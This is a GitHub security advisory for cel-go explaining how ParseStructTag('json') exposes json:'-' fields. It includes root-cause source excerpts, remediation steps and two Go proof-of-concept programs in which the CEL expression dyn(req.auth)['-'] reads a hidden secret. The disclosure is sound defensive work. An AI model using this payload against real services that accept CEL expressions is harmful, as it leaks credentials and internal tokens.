# [M] cel-go: JSON Private Fields Exposed via NativeTypes and ParseStructTag

## Summary
Severity: Medium
Advisory: GHSA-gcjh-h69q-9w9g
CWE: CWE-495
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-gcjh-h69q-9w9g
Type: github-advisory

## Affected
- Go: `github.com/google/cel-go` — affected >=0.22.0 <0.29.0

## Details
The function `ext.NativeTypes(ParseStructTag("json"))` does not honour the `encoding/json` skip directive `json:"-"`. Fields tagged `json:"-"` are registered in the CEL type system under the literal name `"-"` and are readable from any user-submitted CEL expression via `dyn(obj)["-"]`. 

Additionally, `newNativeTypes` silently registers every nested struct reachable from the type passed to `NativeTypes`, including types from third-party dependencies the developer never examined.

## Root cause

In `fieldNameByTag`, the helper used by `ParseStructTag("json")` to translate Go struct tags into CEL field names.

See at `ext/native.go:146`:

```go
func fieldNameByTag(structTagToParse string) func(field reflect.StructField) string {
    return func(field reflect.StructField) string {
        tag, found := field.Tag.Lookup(structTagToParse)
        if found {
            splits := strings.Split(tag, ",")
            if len(splits) > 0 {
                // We make the assumption that the leftmost entry in the tag is the name.
                // This seems to be true for most tags that have the concept of a name/key, such as:
                // https://pkg.go.dev/encoding/xml#Marshal
                // https://pkg.go.dev/encoding/json#Marshal
                // https://pkg.go.dev/go.mongodb.org/mongo-driver/bson#hdr-Structs
                // https://pkg.go.dev/go.yaml.in/yaml/v3#Marshal
                name := splits[0]
                return name
            }
        }

        return field.Name
    }
}
```

For a field tagged `json:"-"`, this code splits the tag into `[]string{"-"}` and returns `"-"` as the CEL field name. It never checks whether `"-"` is the JSON skip sentinel.

This contradicts the `encoding/json` rule that the source comment explicitly points readers to:

```text
As a special case, if the field tag is "-", the field is always omitted. Note
that a field with name "-" can still be generated using the tag "-,".
```

The public option also documents JSON-style parsing as the intended behavior.
See at `ext/native.go:190`:

```go
// ParseStructTag configures the struct tag to parse. The 0th item in the tag is used as the name of the CEL field.
// For example:
// If the tag to parse is "cel" and the struct field has tag cel:"foo", the CEL struct field will be "foo".
// If the tag to parse is "json" and the struct field has tag json:"foo,omitempty", the CEL struct field will be "foo".
func ParseStructTag(tag string) NativeTypesOption {
    return func(ntp *nativeTypeOptions) error {
        ntp.fieldNameHandler = fieldNameByTag(tag)
        return nil
    }
}
```

A developer using `ParseStructTag("json")` is therefore led to expect `encoding/json` field-name semantics. Instead, `json:"-"` is treated as a real field name.

The bad name is accepted during native type construction. `newNativeType` checks for duplicate field names, but it does not reject or skip empty names or skip sentinels.

See at `ext/native.go:663`:

```go
if fieldNameHandler != nil {
    fieldNames := make(map[string]struct{})

    for idx := 0; idx < refType.NumField(); idx++ {
        field := refType.Field(idx)
        fieldName := toFieldName(fieldNameHandler, field)

        if _, found := fieldNames[fieldName]; found {
            return nil, fmt.Errorf("invalid field name `%s` in struct `%s`: %w", fieldName, refType.Name(), errDuplicatedFieldName)
        } else {
            fieldNames[fieldName] = struct{}{}
        }
    }
}
```

Once accepted, the field becomes part of CEL's view of the type. Field enumeration reports it as a normal field name.

See at `ext/native.go:286`:

```go
func (tp *nativeTypeProvider) FindStructFieldNames(typeName string) ([]string, bool) {
    if t, found := tp.nativeTypes[typeName]; found {
        fieldCount := t.refType.NumField()
        fields := make([]string, fieldCount)
        for i := 0; i < fieldCount; i++ {
            fields[i] = toFieldName(tp.options.fieldNameHandler, t.refType.Field(i))
        }
        return fields, true
    }
    if celTypeFields, found := tp.baseProvider.FindStructFieldNames(typeName); found {
        return celTypeFields, true
    }
    return tp.baseProvider.FindStructFieldNames(typeName)
}
```

Field lookup also treats the name as valid and returns the underlying Go field value.

See at `ext/native.go:303`:

```go
func (tp *nativeTypeProvider) FindStructFieldType(typeName, fieldName string) (*types.FieldType, bool) {
    t, found := tp.nativeTypes[typeName]
    if !found {
        return tp.baseProvider.FindStructFieldType(typeName, fieldName)
    }
    refField, isDefined := t.hasField(fieldName)
    if !found || !isDefined {
        return nil, false
    }

    return &types.FieldType{
        IsSet: func(obj any) bool {
            refVal := reflect.Indirect(reflect.ValueOf(obj))
            refField := refVal.FieldByName(refField.Name)
            return !refField.IsZero()
        },
        GetFrom: func(obj any) (any, error) {
            refVal := reflect.Indirect(reflect.ValueOf(obj))
            refField := refVal.FieldByName(refField.Name)
            return getFieldValue(refField), nil
        },
    }, true
}
```

At runtime, native objects advertise index access.
See at `ext/native.go:37`:

```go
var (
    nativeObjTraitMask = traits.FieldTesterType | traits.IndexerType
)
```

Because `traits.IndexerType` is present, a user expression can bypass ordinary field syntax and read the registered `"-"` field with bracket access:

```cel
dyn(req.auth)["-"]
```

The same mistaken name is also used when converting native objects to JSON-like CEL values. `ConvertToNative(jsonStructType)` iterates all Go struct fields, computes the CEL field name, and inserts it into the output map without applying the JSON skip rule.

See at `ext/native.go:501`:

```go
case jsonStructType:
    refVal := reflect.Indirect(o.refValue)
    refType := refVal.Type()
    fields := make(map[string]*structpb.Value, refVal.NumField())
    for i := 0; i < refVal.NumField(); i++ {
        fieldType := refType.Field(i)
        fieldValue := refVal.Field(i)
        if !fieldValue.IsValid() || fieldValue.IsZero() {
            continue
        }
        fieldName := toFieldName(o.valType.fieldNameHandler, fieldType)
        fieldCELVal := o.NativeToValue(fieldValue.Interface())
        fieldJSONVal, err := fieldCELVal.ConvertToNative(jsonValueType)
        if err != nil {
            return nil, err
        }
        fields[fieldName] = fieldJSONVal.(*structpb.Value)
    }
    return &structpb.Struct{Fields: fields}, nil
```

This means a `json:"-"` secret is exposed in two ways: it can be read directly through CEL indexing as `dyn(obj)["-"]`, and it can appear under the key `"-"` in JSON struct conversion output.

The blast radius is widened by `newNativeTypes`, which registers not only the type explicitly passed to `NativeTypes`, but also every nested struct reachable from its fields.

See at `ext/native.go:609`:

```go
func newNativeTypes(fieldNameHandler NativeTypesFieldNameHandler, rawType reflect.Type) ([]*nativeType, error) {
    nt, err := newNativeType(fieldNameHandler, rawType)
    if err != nil {
        return nil, err
    }
    result := []*nativeType{nt}

    var iterateStructMembers func(reflect.Type)
    iterateStructMembers = func(t reflect.Type) {
        if k := t.Kind(); k == reflect.Pointer || k == reflect.Slice || k == reflect.Array || k == reflect.Map {
            iterateStructMembers(t.Elem())
            return
        }
        if t.Kind() != reflect.Struct {
            return
        }

        nt, ntErr := newNativeType(fieldNameHandler, t)
        if ntErr != nil {
            err = ntErr
            return
        }
        result = append(result, nt)

        for idx := 0; idx < t.NumField(); idx++ {
            iterateStructMembers(t.Field(idx).Type)
        }
    }
    iterateStructMembers(rawType)

    return result, err
}
```

As a result, a developer can register one apparently safe request type while a nested dependency type is silently registered too. If that nested type contains a `json:"-"` secret, CEL still receives a readable field named `"-"` even though the developer never registered or audited that nested type directly.

## Reproduction

```go
package main

import (
    "fmt"
    "reflect"

    "github.com/google/cel-go/cel"
    "github.com/google/cel-go/ext"
)

// Simulates a library type; developer never registers this directly.
type AuthCtx struct {
    UserID string `json:"userId"`
    Secret string `json:"-"` // server-internal; never appears in JSON output
}

// Developer registers only this type.
type Req struct{ Auth AuthCtx `json:"auth"` }

func main() {
    env, _ := cel.NewEnv(
        // Only Req is passed; AuthCtx is registered silently by newNativeTypes.
        ext.NativeTypes(reflect.TypeOf(Req{}), ext.ParseStructTag("json")),
        cel.Variable("req", cel.ObjectType("main.Req")),
    )
    ast, _ := env.Compile(`dyn(req.auth)["-"]`)
    prg, _ := env.Program(ast)
    out, _, _ := prg.Eval(map[string]any{
        "req": Req{Auth: AuthCtx{UserID: "alice", Secret: "sk-live-s3cr3t"}},
    })
    fmt.Println(out) // sk-live-s3cr3t
}
```

**Expected:** expression compile error or empty result; `json:"-"` field should not be
accessible.  
**Actual:** `sk-live-s3cr3t`; the server-injected secret is returned verbatim.

The same field is also included under key `"-"` in `ConvertToNative(jsonStructType)`
output, and appears in `FindStructFieldNames` enumeration.

### path 1. CEL indexing

Tested against the released module `github.com/google/cel-go v0.28.1`
(latest stable release as of 2026-05-12), using the `go.mod` entry:

```
require github.com/google/cel-go v0.28.1
```

Running the PoC above (`go run main.go`) produces:

```
sk-live-s3cr3t
```

The secret value is returned verbatim, with no error at compile time or at runtime.

### Path 2. `ConvertToNative(jsonStructType)`

When the `nativeObj` for the `AuthCtx` value is converted to a Protobuf `Struct`
(the representation used whenever CEL output is serialised to JSON), the
`json:"-"` field appears in the output map under the key `"-"`.

```go
package main

import (
    "encoding/json"
    "fmt"
    "reflect"

    "github.com/google/cel-go/cel"
    "github.com/google/cel-go/ext"

    structpb "google.golang.org/protobuf/types/known/structpb"
)

type AuthCtxConv struct {
    UserID string `json:"userId"`
    Secret string `json:"-"` // should never appear in JSON output
}

type ReqConv struct{ Auth AuthCtxConv `json:"auth"` }

func main() {
    env, _ := cel.NewEnv(
        ext.NativeTypes(reflect.TypeOf(ReqConv{}), ext.ParseStructTag("json")),
        cel.Variable("req", cel.ObjectType("main.ReqConv")),
    )

    ast, _ := env.Compile(`req.auth`)
    prg, _ := env.Program(ast)
    out, _, _ := prg.Eval(map[string]any{
        "req": ReqConv{Auth: AuthCtxConv{UserID: "alice", Secret: "sk-live-s3cr3t"}},
    })

    jsonStructType := reflect.TypeOf(&structpb.Struct{})
    raw, _ := out.ConvertToNative(jsonStructType)

    st := raw.(*structpb.Struct)
    b, _ := json.MarshalIndent(st.AsMap(), "", "  ")
    fmt.Printf("ConvertToNative(jsonStructType) output:\n%s\n", b)
    fmt.Printf("\nDirect field access via \"-\" key present: %v\n", st.Fields["-"] != nil)
    if v, ok := st.Fields["-"]; ok {
        fmt.Printf("Value: %s\n", v.GetStringValue())
    }
}
```

Running the PoC above produces:

```
ConvertToNative(jsonStructType) output:
{
  "-": "sk-live-s3cr3t",
  "userId": "alice"
}

Direct field access via "-" key present: true
Value: sk-live-s3cr3t
```

The `"-"` key is present in the serialised Protobuf struct alongside `userId`.
Any system that converts a CEL evaluation result to JSON (e.g. via `structpb.Struct`) will include the secret in the output, regardless of whether the `dyn()["-"]` indexing path is used.

## Impact

Any user who can submit CEL expressions to an application that uses `ext.NativeTypes(ParseStructTag("json"))` can read struct fields that the developer explicitly marked `json:"-"` to keep out of serialised output. By writing `dyn(obj)["-"]`, the attacker retrieves the raw Go field value, typically a secret, internal token, or private identifier, with no compile-time or runtime error. Because `newNativeTypes` silently registers every nested struct reachable from the root type, the attacker may also reach secrets in dependency types the developer never intended to expose to CEL.

## Remediation

Do not treat `json:"-"` as a CEL field named `"-"`. Model it as an explicit skipped field, not as an empty string field name.

Update the struct-tag parsing path so exact `json:"-"` returns “skip this field”, while `json:"-,"` continues to mean the literal field name `"-"`, matching `encoding/json` semantics.

Apply that skip decision consistently anywhere native fields are exposed or resolved:

- duplicate-name validation in `newNativeType`
- field enumeration in `FindStructFieldNames`
- field type lookup in `FindStructFieldType`
- runtime lookup in `fieldByName` / `hasField`
- object construction in `NewValue`
- JSON conversion in `ConvertToNative(jsonStructType)`

Apply the same omit handling for `xml:"-"`, `yaml:"-"`, and `bson:"-"` where `ParseStructTag` is used.

## References
- https://github.com/cel-expr/cel-go/security/advisories/GHSA-gcjh-h69q-9w9g
- https://github.com/cel-expr/cel-go
